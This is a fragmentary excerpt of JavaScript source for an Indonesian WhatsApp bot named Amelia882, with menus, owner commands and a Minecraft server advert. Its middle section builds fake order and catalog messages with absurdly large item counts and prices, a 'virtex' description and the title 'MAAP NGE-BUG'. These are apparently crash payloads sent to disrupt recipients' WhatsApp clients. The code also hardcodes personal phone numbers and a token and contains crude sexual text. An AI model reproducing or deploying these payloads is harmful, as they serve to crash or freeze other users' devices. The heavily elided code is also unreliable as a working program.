...
module.exports = dha = async (dha, mek) => {
	try {
        ...
        const prefix = /.,?!=#:"'$@-+_&€¥£¢₹₦/-/=<>•~§\πΠ¤Φ√%©®^Δβα°/.test(cmd) ? cmd.match(/.,?!=#:"'$@-+_&€¥£¢₹₦/-/=<>•~§\πΠ¤Φ√%©®^Δβα°/gi) : '!'
...
➸ *Sejak* : ${getTime}`
      mentions(cptl, x, true)
       ...
       case 'donasi':
               ...
               buttonsMessage = {
               contentText: `${txtt}`,
               footerText: 'Maasih Yang Sudah Donasi',
               buttons: buttons,
               headerType: 1
}
...
༒ *INFO BOT* ༒
ᱝ *Nama : *Amelia882*
ᱝ *Nomor :* @6289514235883 (pembuat)
ᱝ *Owner : *ArekN88w* 
ᱝ *Aiktif :*  ${runtime(process.uptime())}
ᱝ *Prefix :* 『> ${prefix} <』

༒ *LIST '͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋MENU* ༒
ᱝ *#Ownermenu*
ᱝ *#Groupmenu*
ᱝ *#Infomenu*
ᱝ *#Downloadmenu*
...
༒ *INFO TODAY* ༒
ᱝ *Pukul :* ${moment().utcOffset('+0700').format('HH:mm')}
ᱝ *Tanggal :* ${moment.tz('Asia/Jakarta').format('DD/MM')}
ᱝ *User :* ${pushname}`
               ...
               buttonsMessage = {
               contentText: `${menu}`,
               footerText: 'Amelia_Bot', imageMessage: imageMsg,
               buttons: buttons,
               headerType: 4
}
...
*Cek list Server GTLI dibawah!*`
               ...
               footerText: 'Amelia882', imageMessage: imageMsg,
               buttons: buttons,
               headerType: 4
}
...
*Cek list Server GTIVD dibawah!*`
       ...
       case 'othercmd':
               ...
               startnum = 0
               for (let x of listmenu) {
               const yy = {title: 'Amelia882' + nombor++,
                    rows: [
                       {
                        title: `${listmenuu[startnum++]}`,
                        description: ``,
               ...
               listmsg(from, `${ucapanWaktu}`,   `Anjay`, list)
               break
//------------------< Game >------------------- 
        case 'limitgame': 
        case 'balance': 
...
case 'mcs':
              gopeynya = 'https://i.ibb.co/YQwrfvq/lolis.jpg'
              teksnya = `*Welcome To Minecraft Server*
Bedrock Server
*Ip*     :
*Port* :
...
*|Rules|*
*Gak Boleh Pake Cheat*
*Dupe Bug Gakpapa, Asal Ngak Ketahuan*
*Toxic Boleh, Tapi Sewajarnya!!*
*Menghargai Pelayer Lain*

*Minat Join? Chat* wa.me/6289514235883
#NENEK_MOJANG!`
              dha.sendMessage(from, await getBuffer(gopeynya), image, {quoted: ftoko, caption: teksnya })
              break
...
//------------------< Sticker/Tools >-------------------
       ...
       case 'dadu': // by PUTRA GANSTENGSSSZZ
              reply(mess.wait)
              dadu()
             .then(async (body) => {
...
"itemCount": 8829999999999,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "MAAP NGE-BUG",
"message":"YAMETE KUDASAI SENPAI",
"sellerJid": "6285163079882@s.whatsapp.net",
"token": "AR7i5IXXiMA6NjT0DxcwdcKxhXCy1rOrvlNJzqXPMr8PCg==",
"totalAmount1000": "882 BTC",
...
"title": `Amelia~882 ${vipi}`,
"description": `${virtex}`,
"currencyCode": "IDR",
"priceAmount1000": "99999999999999999999999999999999",
"productImageCount": 1
},
"businessOwnerJid": "6285163079882@s.whatsapp.net",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
...
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "NekoPoi.care",
"message":"Coli 100x sehari",
"sellerJid": "6289514235882@s.whatsapp.net",
"token": "AR7i5IXXiMA6NjT0DxcwdcKxhXCy1rOrvlNJzqXPMr8PCg==",
...
"orderTitle": "LOL",
"message":"Hallo Kak",
"sellerJid": "6285893228346@s.whatsapp.net",
"token": "AR7i5IXXiMA6NjT0DxcwdcKxhXCy1rOrvlNJzqXPMr8PCg==",
"totalAmount1000": "99999999999999999999",
"totalCurrencyCode": "IDR",
"contextInfo": {
...
dha.sendMessage(_.jid, 
      ...
      case 'nyimak':
             if (!isOwner) return 
             gopeynya = 'https://i.ibb.co/T2NZ1WH/Nyimak.jpg'
             reply(`Owner Sedang Menyimak`)
             await sleep(100)
             process.exit()
             break
      case 'shutdown':
             if (!isOwner) return 
             gopeynya = 'https://i.ibb.co/S015P7z/loliT.jpg'
             reply(`Bot Mau Bobo...`)
             await sleep(3000)
             process.exit()
             break
...
case 'linkgc':
      ...
      case 'hidetag':
             ...
             break
      case 'oi':
             if (!isOwner && !isPremium) return reply("kamu Siapa Kamu Siapa")
             try {
             quotedText = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
             hideTag(from, `${quotedText}`)
             } catch {
...
case 'caripesan':  //by ANU TEAM
       ...
       case 'bugreport':
              ...
              dha.sendMessage('6289514235883@s.whatsapp.net',`*Bug Report:* ${teks}`, text)
              break
       case 'readall':
...
reply('_' + err + '_\n\n' + js)
       ...
       if (budy.includes(`@6285163079882`)) {
...
dha.sendMessage(from, baby, MessageType.sticker, {quoted: mek})
       ...
       if (budy.includes(`@6289514235883`)) {
